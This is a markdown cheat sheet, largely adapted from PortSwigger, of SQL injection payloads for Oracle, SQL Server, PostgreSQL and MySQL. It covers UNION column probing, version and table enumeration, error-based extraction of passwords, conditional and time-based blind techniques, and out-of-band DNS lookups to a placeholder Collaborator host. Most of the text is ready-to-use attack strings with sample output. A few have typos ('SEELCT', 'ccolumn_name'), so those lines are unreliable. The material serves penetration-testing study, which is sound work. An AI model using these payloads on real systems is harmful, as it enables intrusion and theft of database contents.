# Sql injection cheat sheets (can be found also [here](https://portswigger.net/web-security/sql-injection/cheat-sheet))
This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. 


### First of all, in order to apply those commands with success we need to determine how many ***columns*** does the site/server uses
```sql
` UNION SEELCT NULL,NULL--
```
- And so on you add more `NULL` to test if needed. When you find the correct number of ***columns*** you will use them with the command you want to execute.
- Example, server needed 2 columns. I removed one column and replaced it with the command i want to execute. 
```sql
' UNION SELECT NULL,version()--
```
**Result:**
```sql
PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```
#

***IF WE RUN*** the following command **without using the correct columns** you will see that you won't get any result or you may be blocked:
```sql
' UNION SELECT version()--
```
![image](https://github.com/th3knv/sql_cheatsheets/assets/76121926/027ea585-93ef-4247-8452-2451d3801338)


## String concatenation
*You can concatenate together multiple strings to make a single string*

| Type | String |
| --- | --- |
| Oracle   | `'foo'\|\|'bar'` |
| Microsoft |  `'foo'+'bar'` |
| PostgreSQL | ` 'foo'\|\|'bar'`|
| MySQL | `'foo' 'bar'` <br> `CONCAT('foo','bar')`|



## Substring
*You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.*

| Type | String |
| --- | --- |
| Oracle   | `SUBSTR('foobar', 4, 2)` |
| Microsoft |  `SUBSTR('foobar', 4, 2)` |
| PostgreSQL | `SUBSTR('foobar', 4, 2)`|
| MySQL | `SUBSTR('foobar', 4, 2)`| 


## Comments
*You can use comments to truncate a query and remove the portion of the original query that follows your input.*

| Type | String |
| --- | --- |
| Oracle   |` --comment` |
| Microsoft | `--comment` <br>` /*comment*/ ` |
| PostgreSQL | `--comment` <br>` /*comment*/ ` |
| MySQL | `-- comment` <br>` /*comment*/ ` <br>`#comment`


## Database version
*You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.*

| Type | String |
| --- | --- |
| Oracle   | `SELECT banner FROM v$version` <br> `SELECT version FROM v$instance` |
| Microsoft |  `SELECT @@version ` |
| PostgreSQL | `SELECT version() `|
| MySQL | `SELECT @@version `| 

 - For example, you could use a ***UNION*** attack with the following input: 
```sql
' UNION SELECT @@version--
```
This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
```sql
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

#

## Database contents
*You can list the tables that exist in the database, and the columns that those tables contain.*

## `*`
> This Defines that you might have to add more columns in the code in order for code to work

| Type | String |
| --- | --- |
| Oracle   | `SELECT table_name,* FROM all_tables` <br> `SELECT column_name,* FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT ccolumn_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

 With `.tables` it returns output like the following: 
 ```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

With `.columns` and the **table name** it returns output like the following:
```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

- Example of **PostgreSQL**printing tables. In the following coode server applies 2 columns. We replace one of those with **table_name**. 
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
 ```

![image](https://github.com/th3knv/sql_cheatsheets/assets/76121926/320a6b49-7f3d-4d7d-beda-f84a3fd7c4ca)

#

## Conditional errors
*You can test a single boolean condition and trigger a database error if the condition is true.*

| Type | String |
| --- | --- |
| Oracle   | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft |  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`| 


## Extracting data via visible error messages
*You can potentially elicit error messages that leak sensitive data returned by your malicious query.*

| Type | String |
| --- | --- |
| Microsoft   | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` <br> > Conversion failed when converting the varchar value 'secret' to data type int. |
| PostgreSQL |  ` SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` <br> > invalid input syntax for integer: "secret" |
| MySQL | ` SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` <br> > XPATH syntax error: '\secret' |


## Batched (or stacked) queries
*You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.*

| Type | String |
| --- | --- |
| Oracle   | ~~Does not support batched queries.~~ |
| Microsoft |  ` QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | ` QUERY-1-HERE; QUERY-2-HERE `|
| MySQL | ` QUERY-1-HERE; QUERY-2-HERE `| 

- Note
> With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.


## Time delays
*You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.*

| Type | String |
| --- | --- |
| Oracle   | ` dbms_pipe.receive_message(('a'),10) ` |
| Microsoft |  ` WAITFOR DELAY '0:0:10' ` |
| PostgreSQL | ` SELECT pg_sleep(10) `|
| MySQL | ` SELECT SLEEP(10) `|



## Conditional time delays
*You can test a single boolean condition and trigger a time delay if the condition is true.*

| Type | String |
| --- | --- |
| Oracle   | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual |
| Microsoft |  ` IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' ` |
| PostgreSQL | ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END `|
| MySQL | ` SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') `| 



## DNS Lookup
*You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.*

| Type | String |
| --- | --- |
| Oracle   | The following technique leverages an XML external entity [XXE](https://portswigger.net/web-security/xxe) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: <br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br> The following technique works on fully patched Oracle installations, but requires elevated privileges: <br> `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft |  `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' ` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' `|
| MySQL | The following techniques work on Windows only <br> `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`| 

#

#
## More coming soon
